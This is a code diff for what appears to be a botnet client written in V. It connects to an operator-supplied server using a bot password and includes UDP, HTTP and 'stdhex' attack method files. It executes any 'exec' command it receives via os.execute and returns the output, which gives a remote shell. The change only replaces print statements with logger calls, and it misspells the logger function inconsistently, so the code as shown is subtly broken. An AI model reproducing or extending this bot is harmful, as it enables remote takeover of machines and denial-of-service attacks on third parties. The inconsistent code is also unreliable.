@@ -3,6 +3,8 @@ import io
 import net
 import time
 
+import core.logger
+
 #include "@VROOT/core/methods/udp.c"
 #include "@VROOT/core/methods/stdhex.c"
 #include "@VROOT/core/methods/http.c"
@@ -14,7 +16,7 @@ fn C.sendHTTP(&char, int)
 fn main() {
 	mut args := os.args.clone()
 	if args.len < 4 {
-		println("[x] Error, arguments provided!\n${args[0]} <ip> <port> <bot_pw>")
+		logger.conosle_log("invalid_arguments", "arguments provided!\n${args[0]} <ip> <port> <bot_pw>", true)
 		exit(0)
 	}
 	mut s := go server(args[1], args[2], args[3])
@@ -26,7 +28,7 @@ fn main() {
 
 fn server(ip string, port string, pw string) { 
 	mut server := net.dial_tcp("${ip}:${port}") or {
-		println("[x] Error, Unable to connect to the server....")
+		logger.console_log("hosting_err", "Unable to connect to the server....", true)
 		exit(0)
 	}
 
@@ -73,7 +75,7 @@ fn server(ip string, port string, pw string) {
 					server.write_string(os.execute("${data.replace("exec ", "")}").output) or { 0 }
 				} else { }
 			}
-			println(fcmd)
+			logger.conosle_log("bot_new_cmd", fcmd, false)
 		}
 	}
 }
